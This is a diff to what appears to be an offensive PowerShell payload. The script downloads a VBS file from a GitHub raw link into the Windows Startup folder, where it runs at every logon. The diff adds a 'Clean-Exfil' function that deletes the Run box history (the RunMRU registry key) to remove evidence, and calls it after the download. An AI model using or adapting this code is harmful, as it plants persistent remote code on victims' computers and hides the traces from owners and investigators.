@@ -10,12 +10,30 @@ $scriptFilename = "script.vbs"
 # Combine the startup folder path with the script filename
 $destinationPath = Join-Path -Path $startupFolder -ChildPath $scriptFilename
 
-# Download the script from GitHub
-Invoke-WebRequest -Uri $githubRawLink -OutFile $destinationPath
+# Function to clean up after script execution
+function Clean-Exfil {
+    <#
+    .NOTES 
+        This function cleans up after script execution, removing evidence.
+    #>
 
-# Check if the download was successful
-if (Test-Path $destinationPath) {
+    try {
+        # Delete run box history
+        reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f | Out-Null
+
+        Write-Host "Run box history cleared."
+    }
+    catch {
+        Write-Error "Failed to clear run box history: $_"
+    }
+}
+
+# Download the script from GitHub
+try {
+    Invoke-WebRequest -Uri $githubRawLink -OutFile $destinationPath
     Write-Host "Script downloaded and saved to startup folder successfully."
-} else {
-    Write-Host "Failed to download or save the script."
+    Clean-Exfil  # Clean up after script execution
+} 
+catch {
+    Write-Host "Failed to download or save the script: $_"
 }
